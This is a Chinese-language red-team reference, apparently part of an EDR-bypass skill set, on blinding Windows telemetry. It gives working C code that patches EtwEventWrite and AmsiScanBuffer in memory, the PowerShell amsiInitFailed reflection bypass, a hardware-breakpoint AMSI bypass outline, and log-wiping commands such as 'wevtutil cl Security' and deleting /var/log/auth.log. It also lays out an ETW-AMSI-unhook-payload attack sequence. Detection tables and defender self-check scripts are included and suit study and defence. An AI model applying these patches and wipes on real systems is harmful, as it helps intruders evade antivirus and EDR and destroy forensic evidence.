# 遥测致盲：ETW patch、AMSI bypass、日志清除

> 被 `edr-bypass-re` 引用。核心认知：**致盲 ≠ 隐身**。
> 你消掉的每一条遥测，都可能被另一个来源补上（内核回调、网络、内存扫描）。
> 所以每个手法后面都写了"致盲后还剩什么会留痕"。

## 一、先分清三条遥测通道

| 通道 | 产生方 | 消费方 | 致盲手段 | 致盲后残留 |
| --- | --- | --- | --- | --- |
| **ETW**（用户态 provider） | 进程自己 `EtwEventWrite` | ETW 消费者（EDR/Sysmon） | patch `EtwEventWrite` | 内核 provider 仍记录 |
| **ETW-TI**（Threat-Intelligence） | **内核**直接写 | 需要 PPL 权限订阅 | **用户态无法 patch** | 无法消除 |
| **AMSI** | 脚本宿主/CLR 调 `AmsiScanBuffer` | Defender/第三方 AV | patch `amsi.dll` | 行为类检测仍在 |
| **内核回调** | 内核（Ps/Cm/Ob） | EDR 驱动 | 无法从用户态绕过 | 必须改行为 |
| **网络** | TCP/IP 栈 | 防火墙/NDR | 无法致盲 | 无法消除 |

```text
关键结论（写进报告的硬事实）：
  1. ETW-TI 是内核产生、内核消费，patch 用户态 EtwEventWrite **完全无效**
  2. 内核回调（进程/线程/映像/对象/注册表）无法从用户态绕过
  3. 网络层遥测（DNS/TLS SNI/流）无法致盲
  → 真正的"隐身"只能靠"行为合法化"，致盲只是降低噪声
```

## 二、ETW patch

### 2.1 `EtwEventWrite` head patch（最经典）

```c
// 原理：把 EtwEventWrite 的第一条指令改成 "xor eax,eax; ret"
//      （返回 0 = STATUS_SUCCESS，调用方认为写入成功，实际丢弃）
// 注意：这会破坏所有 ETW provider（包括系统自身的），部分系统组件会异常

#include <windows.h>

BOOL PatchEtw(VOID) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID fn = GetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) return FALSE;

    BYTE patch[] = { 0x33, 0xC0, 0xC3 };       // xor eax,eax; ret
    DWORD old = 0;
    if (!VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old)) return FALSE;
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
    return TRUE;
}
```

| 风险 | 说明 |
| --- | --- |
| 全局破坏 | 进程内所有 ETW 都失效 → .NET/诊断组件可能异常 |
| 版本差异 | 部分 Windows 的 `EtwEventWrite` 是 forwarder（跳 `EtwEventWriteFull`），
  只 patch 其中一个无效 |
| 检测 | `EtwEventWrite` 头字节变化是"经典特征"，很多 EDR 直接查 |

```c
// 更稳的做法：只 patch 到 "让调用方认为成功" 且不影响其他 provider
// 或者在 EtwEventWrite 的调用点做过滤（只丢特定 provider 的事件）
```

### 2.2 关闭特定 provider（更精准、噪声更小）

```powershell
# 找到目标 provider 的 GUID，然后禁用其会话
logman query providers | Select-String "Threat Intelligence|Kernel-Process"

# 若 EDR 用自定义会话，可尝试停止（需要管理员，且会被检测）
logman stop "<session name>" -ets
# 或
wevtutil sl "<channel>" /e:false
```

```c
// 程序内：NtTraceControl(EtwpUpdateProviderTraces) 可关 provider
// 但这个 API 未文档化、且部分版本失效——不推荐作为主手段
```

### 2.3 检测视角

| 你的动作 | EDR 会不会看到 |
| --- | --- |
| patch `EtwEventWrite` 的 3 字节 | **会**（完整性检查 / 内存扫描；且 patch 后 ETW 事件量骤降=异常） |
| 关闭 provider 会话 | 会（`logman`/`NtTraceControl` 可被审计；且该 provider 停止上报=异常） |
| 不 patch，只减少事件 | 不会（但行为本身可能被其他通道发现） |

> **重要**：ETW patch 是"高特征"动作。现代 EDR 会**优先检测 ETW 被改**，
> 一旦发现就升级处置。所以它不是"隐身手段"，只是"降低噪声"。

## 三、AMSI bypass

### 3.1 各种实现

| 手法 | 做法 | 现状 |
| --- | --- | --- |
| `AmsiScanBuffer` patch | 改成 `mov eax, 0x80070057; ret`（E_INVALIDARG） | 仍有效，但特征明显 |
| `AmsiOpenSession` patch | 让 session 无效，后续 scan 短路 | 有效，特征较新 |
| `amsiInitFailed` 变量置 1 | 让 AMSI 认为初始化失败 | **已失效**（新版本不检查该变量） |
| 反射加载干净 `amsi.dll` | 内存加载一份并改 | 有效 |
| HWBP（硬件断点） | 用 DR 寄存器在 `AmsiScanBuffer` 下断，改返回值 | 有效，特征低 |
| 卸载/替换 | `LoadLibrary` 前先占位 | 有效 |
| .NET 层 | 改 `System.Management.Automation` 的 AMSI 调用 | 特定于 PS |

```c
// 经典 AmsiScanBuffer patch
#include <amsi.h>

BOOL PatchAmsi(VOID) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;
    PVOID fn = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) return FALSE;

    // mov eax, 0x80070057 ; ret    (E_INVALIDARG，调用方视为"扫描失败但不阻断")
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
    return TRUE;
}
```

```powershell
# PowerShell 层（AmsiUtils 反射改字段）——多数版本已失效，仅作参考
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# 检查是否生效（应报错/无输出）
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
```

| AMSI 触发点 | 会被扫的内容 |
| --- | --- |
| PowerShell | 脚本块、`Invoke-Expression` 参数 |
| .NET `Assembly.Load` | 程序集字节 |
| VBScript/JScript | 脚本内容 |
| Office VBA | 宏代码（经 AMSI） |
| WMI | 部分调用 |
| `wscript`/`cscript` | 脚本 |
| Node.js（若装了 AMSI provider） | 脚本 |

### 3.2 HWBP 版（特征更低）

```text
优点：不改 amsi.dll 的字节（完整性检查看不到）
做法：
  1. 为当前线程设置 DR0 = AmsiScanBuffer 地址
  2. DR7 设为"执行断点"
  3. VEH（异常处理器）里拦截 #DB，修改返回值为 E_INVALIDARG，然后继续
缺点：
  □ DR 寄存器可被检测（GetThreadContext）
  □ 多线程要每个线程都设
  □ 实现复杂，易崩
```

## 四、日志清除（高风险，慎用）

| 目标 | 命令 | 风险 |
| --- | --- | --- |
| 清 Security 日志 | `wevtutil cl Security` | **104 事件**（日志被清除）会记在 System 日志 |
| 清 System/Application | `wevtutil cl System` | 同样留 104 |
| 删单个事件 | 需直接操作 `.evtx`（复杂） | 文件被改也会被发现 |
| PowerShell 日志 | `wevtutil cl "Windows PowerShell"` | 104 + 脚本块日志缺失=异常 |
| Sysmon | `wevtutil cl "Microsoft-Windows-Sysmon/Operational"` | 104 + Sysmon 停止上报 |
| Linux | `rm /var/log/auth.log` / `journalctl --vacuum-time=1s` | 文件删除/截断（`auditd` 可监控） |

```powershell
# 清日志（演示用途；真实评估中这是"高噪声"动作）
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# 查看 104 事件（证明"清日志"本身留痕）
Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} -MaxEvents 10 |
  Select-Object TimeCreated, Message
```

**替代方案（低噪声）**：

| 目的 | 低噪声替代 |
| --- | --- |
| 减少可追溯性 | 不做清除，改为**缩短操作窗口**（快进快出） |
| 隐藏 PowerShell | 不用 PowerShell（换 .NET/原生） |
| 隐藏命令行 | 不用命令行参数（配置内嵌） |
| 减少事件量 | 用合法 API 序列（避免高特征调用） |

## 五、致盲后还剩什么（必须写进报告）

| 你消掉的 | 仍然存在的 |
| --- | --- |
| `EtwEventWrite` 事件 | ETW-TI（内核）；内核回调；网络流；内存扫描；文件系统 minifilter |
| AMSI 扫描 | 行为检测（进程树/命令行/网络）；内存中的 shellcode 特征 |
| Security 日志 | System 日志的 104；SIEM 的转发副本；EDR 本地缓存 |
| PowerShell 日志 | 进程创建事件（命令行在 4688/Sysmon 1 里） |
| Sysmon 事件 | EDR 自有传感器；网络设备日志 |

```text
致盲后仍会留痕的清单（交付时必须逐条说明）：
  □ 进程创建（内核回调 + ETW-TI + Sysmon）
  □ 命令行（4688 的 CommandLine / Sysmon 1）
  □ 映像加载（Sysmon 7 / 内核回调）
  □ 网络连接（Sysmon 3 / 防火墙 / NDR）
  □ 文件写入（minifilter / Sysmon 11）
  □ 注册表修改（Sysmon 12/13/14 / 内核回调）
  □ 内存分配与保护（ETW-TI）
  □ 跨进程操作（ETW-TI）
  □ 服务/计划任务创建（4697/4698）
```

## 六、组合顺序（技能正文强调的）

```text
正确顺序：
  1. ETW patch（最先，因为后续动作都会产生事件）
  2. AMSI patch（若用 PS/.NET 投递）
  3. unhook（最后，因为 unhook 本身是高特征动作）
  4. 投递 payload

错误顺序的后果：
  □ 先 unhook → EDR 立刻看到"代码段被改"并升级监控，后续 ETW patch 也被盯上
  □ 先 AMSI → ETW 已记录"amsi.dll 被改内存"
```

| 顺序 | 每一步的"下一步依赖" |
| --- | --- |
| 1 ETW | 让后续动作不被记录（但 ETW-TI 仍在） |
| 2 AMSI | 让脚本/程序集不被扫描 |
| 3 unhook | 让 API 调用回到原生（减少 hook 层日志） |
| 4 payload | 此时噪声最低 |

## 七、检测视角（防守方完整表）

| 手法 | 检测点 |
| --- | --- |
| `EtwEventWrite` patch | 函数头字节（`33 C0 C3`）+ ETW 事件量骤降 + 内存完整性 |
| AMSI patch | `amsi.dll` 的 `AmsiScanBuffer` 头字节 + AMSI 事件缺失 |
| `amsiInitFailed` | 该字段值（新版本已不依赖，但可作为"意图"指标） |
| 清日志 | 事件 104（System）+ SIEM 侧的数据断流 |
| provider 关闭 | `logman` 会话变化 + 该 provider 事件停止 |
| 反射加载 amsi | 内存中出现第二份 `amsi.dll` 映射（无 backing file） |
| HWBP | 线程上下文 DR0-DR7 非零 |

```powershell
# 自查脚本（防守方视角，可用于验证致盲动作是否被记录）

# 1) 取进程内 ntdll 的路径与版本（与磁盘不一致即为可疑）
Get-Process -Id $PID -Module |
  Where-Object { $_.ModuleName -eq 'ntdll.dll' } |
  Select-Object FileName, FileVersion, ModuleMemorySize

# 2) 事件量基线（对比 patch 前后）：某时刻起事件量骤降 = 信号
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 50 |
  Group-Object Id | Select-Object Name, Count

# 3) 是否有人清过日志（104 = 日志被清除，写在 System 日志里）
Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} -MaxEvents 5 |
  Select-Object TimeCreated, Message
```

## 八、验伤信号

| 声称 | 证据 |
| --- | --- |
| "ETW 已 patch" | 函数头字节 = `33 C0 C3` + 触发一个本应产生 ETW 事件的 API 后**没有事件** |
| "AMSI 已绕" | 执行 AMSI 测试字符串（`AMSI Test Sample: 7e72c3ce-...`）不再被拦 |
| "日志已清" | `wevtutil qe Security /c:1` 返回空 + **System 日志有 104** |
| "致盲后仍可用" | 目标操作成功执行（不是"没告警"） |

**反例（看起来成功其实是假）**：

- `amsiInitFailed` 置位后测试字符串仍被拦 → 该手法已失效（新版本）
- ETW patch 后没告警 → 可能 EDR 根本不用 ETW，用的是内核回调/网络
- 清日志后"干净" → System 的 104 事件已经把"清日志"这件事记下来了
- 致盲后 5 分钟没事 → EDR 的周期性完整性检查（每 N 分钟）还没跑到

## 九、常见坑

1. **以为 ETW-TI 能 patch**——它是内核写、内核消费，用户态动不了。
   看到"ETW 已致盲"就以为隐身是**最危险的误判**。
2. **`EtwEventWrite` 是 forwarder**——某些版本要 patch `EtwEventWriteFull`，
   只 patch 前者无效。
3. **AMSI patch 后 .NET 程序异常**——patch 影响整个进程的 AMSI，
   合法的 Defender 集成也会坏。
4. **清日志的顺序**——先清 Security 再清 System，104 事件会留在
   **已被清空的 System 日志里**？不，104 写入发生在清除**之后**，所以会被保留。
   顺序无法规避。
5. **在受监控主机上清日志**——这是"最高噪声"动作之一，
   等于直接告诉对方"有人入侵了"。
6. **只在 32 位进程 patch**——64 位 EDR 组件不受影响，主监控仍在。
7. **忘了 ETW 事件量骤降本身就是告警**——很多 EDR 把"自己的遥测消失"作为攻击指标。